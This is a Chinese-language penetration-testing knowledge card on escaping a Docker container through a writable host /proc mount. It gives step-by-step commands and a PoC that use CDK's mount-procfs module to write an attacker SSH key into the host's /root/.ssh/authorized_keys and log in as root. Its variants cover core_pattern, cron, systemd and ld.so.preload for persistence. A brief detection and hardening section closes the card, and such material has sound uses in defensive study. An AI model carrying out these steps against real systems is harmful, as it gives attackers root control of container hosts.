---
id: cloud-container-docker-host-procfs-mount-write-authorized-keys
title: 容器挂载宿主机 procfs：CDK mount-procfs 直接写宿主机 /root/.ssh/authorized_keys 逃逸
type: scenario
domain: cloud
path: cloud/container
technique: host-procfs-mount-host-file-write
aliases:
- 宿主机 procfs 挂载逃逸
- /host/proc 逃逸
- CDK mount-procfs
- 容器写宿主机 authorized_keys
- procfs 任意文件写
- docker procfs 逃逸
tags:
- docker
- container
- escape
- procfs
- cdk
- authorized-keys
- host-file-write
- linux
- cap-sys-admin
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V82
  verified_at: '2026-11-05T17:54:52+08:00'
  notes: '已对照原文与图03-08核对：CDK evaluate 的 Mounts 显示 /host/proc/sys/kernel/core_pattern rw，CapEff 不含 CAP_SYS_ADMIN；图08 显示 ./cdk run mount-procfs /host/proc/ 写 /root/.ssh/authorized_keys 的一次执行报 signal: aborted (core dumped)，但图06/07 显示随后 ssh -i id_rsa root@8.130.141.114 成功登录并 cat /flag，最终逃逸成立；卡内步骤/命令与原文一致。版本：非 CVE/版本漏洞，未设置 affected_versions。未验证点：截图含一次失败重试，卡内未描述该重试细节；未复跑 PoC。frontmatter 无 sources/source_url。'
---

## 一句话结论

容器内若挂载了宿主机 `/proc`（常见于 `/host/proc`）且可写，攻击者可借 `/proc/1/root` 访问宿主机根文件系统，或使用 CDK 的 `mount-procfs` 模块在宿主机 mount namespace 执行命令，直接把 SSH 公钥写入宿主机 `/root/.ssh/authorized_keys`，再以 root SSH 登录完成逃逸。

## 原理

- Linux 的 `/proc/<pid>/root` 是指向该进程根目录（rootfs）的符号链接；`/proc/<pid>/ns/mnt` 对应该进程的 mount namespace。容器内若能看到宿主机的 `/proc`（例如宿主把 `/proc` bind mount 到容器的 `/host/proc`），就能通过 `/host/proc/1/root` 访问宿主机根文件系统。
- 如果容器拥有 `CAP_SYS_ADMIN` 或对 `/host/proc` 有足够权限，可以通过 `nsenter`/`setns` 进入宿主机 mount namespace，或直接按 `/host/proc/1/root/...` 路径读写宿主机文件，从而绕过容器文件系统隔离。
- CDK 的 `mount-procfs` 模块把上述步骤自动化：接收宿主机 procfs 路径与要执行的命令，切换到宿主机 mount namespace 后以宿主机 root 身份执行。
- 原文容器内发现 `.dockerenv` 与 `/host/proc/sys/kernel/core_pattern`，CDK 评估确认 procfs 挂载可写；随后执行 `mount-procfs` 在宿主机创建 `/root/.ssh/` 并写入攻击者公钥，最后用私钥 SSH 登录宿主机。
- 该逃逸的本质是“容器与宿主机共享 procfs 且权限未收紧”，不是某个 CVE；core_pattern、`/proc/1/root`、nsenter 都是同一挂载暴露的不同利用面。

## 触发条件

- 容器内可看到宿主机 procfs（如 `/host/proc`、`/proc/1/root` 指向宿主机根），且挂载未设为只读。
- 容器具有 `CAP_SYS_ADMIN`，或 `/host/proc` 的权限允许写入/进入 namespace。
- 宿主机根文件系统可经 `/proc/1/root` 访问，且目标目录（如 `/root/.ssh`）可写。
- 宿主机开放 SSH 且允许 root 公钥登录（或可写其他可执行/启动文件）。

## 利用步骤

1. 确认容器环境：
   ```bash
   ls -la /.dockerenv
   mount | grep -E 'proc|/host'
   cat /proc/self/mountinfo | grep -i proc
   ```
2. 上传 CDK（若上传有大小限制，先 `split` 分片再 `cat` 重组，见关联卡），执行评估：
   ```bash
   ./cdk evaluate --full
   ```
   关注 `Mounts` 中的 `/host/proc`、`/host/proc/sys/kernel/core_pattern` 与 Capabilities。
3. 用 `mount-procfs` 在宿主机执行命令：
   ```bash
   ./cdk run mount-procfs /host/proc/ 'mkdir -p /root/.ssh/'
   ./cdk run mount-procfs /host/proc/ 'echo <PUBKEY> > /root/.ssh/authorized_keys'
   ```
4. 用对应私钥 SSH 登录宿主机：
   ```bash
   ssh -i id_rsa root@<host>
   whoami
   ```
5. 若 SSH 不可用，可改写宿主机 cron/systemd/启动脚本，或通过 `core_pattern` 触发 root 命令。

## PoC

```bash
# 1) 容器内确认宿主机 procfs 挂载
mount | grep /host/proc
ls -la /host/proc/1/root

# 2) CDK 评估
./cdk evaluate --full

# 3) 在宿主机 mount namespace 执行命令，写入 SSH 公钥
./cdk run mount-procfs /host/proc/ 'mkdir -p /root/.ssh/'
./cdk run mount-procfs /host/proc/ 'echo "ssh-rsa AAAA... attacker" > /root/.ssh/authorized_keys'

# 4) SSH 登录宿主机
ssh -i id_rsa root@<host>
```

## 变体与关联

- 变体：直接用 `/host/proc/1/root/root/.ssh/authorized_keys` 路径写入，不依赖 CDK；或用 `nsenter -t 1 -m -p` 进入宿主机 namespace。
- 变体：利用同一 procfs 挂载修改 `/host/proc/sys/kernel/core_pattern`，通过崩溃进程触发宿主机 root 命令（见关联卡）。
- 变体：写宿主机 cron、systemd unit、`/etc/ld.so.preload` 或 Web 目录实现持久化/代码执行。
- 关联：[[cloud-container-docker-procfs-core-pattern-escape]]（同挂载的 core_pattern 逃逸）、[[cloud-container-docker-privileged-host-disk-escape]]（特权容器挂载宿主机磁盘）、[[cloud-container-docker-socket-tcp-escape]]（docker.sock 逃逸）、[[pentest-c2-webshell-upload-size-limit-split-join]]（分片上传 CDK）。
- 边界：宿主未挂载 procfs 到容器、procfs 只读、容器无 `CAP_SYS_ADMIN`、AppArmor/SELinux 阻止访问 `/proc/1/root`、宿主机禁用 root SSH 时，该路径失败。

## 检测与防御

- 检测：容器内出现对 `/host/proc/1/root`、`/proc/1/ns/mnt` 的访问；`nsenter`/`setns` 系统调用；宿主机 `/root/.ssh/authorized_keys` 被非管理员修改；容器进程在宿主机 mount namespace 执行命令（CDK 特征）。
- 修复：不要把宿主机 `/proc` 挂载进容器；必须挂载时设为只读并限制路径；移除容器的 `CAP_SYS_ADMIN` 与 `--privileged`。
- 加固：启用 seccomp/AppArmor/SELinux 限制 `mount`/`setns`/`ptrace`；宿主机 SSH 禁止 root 登录并使用受控密钥；监控 authorized_keys、cron、systemd 的变更。
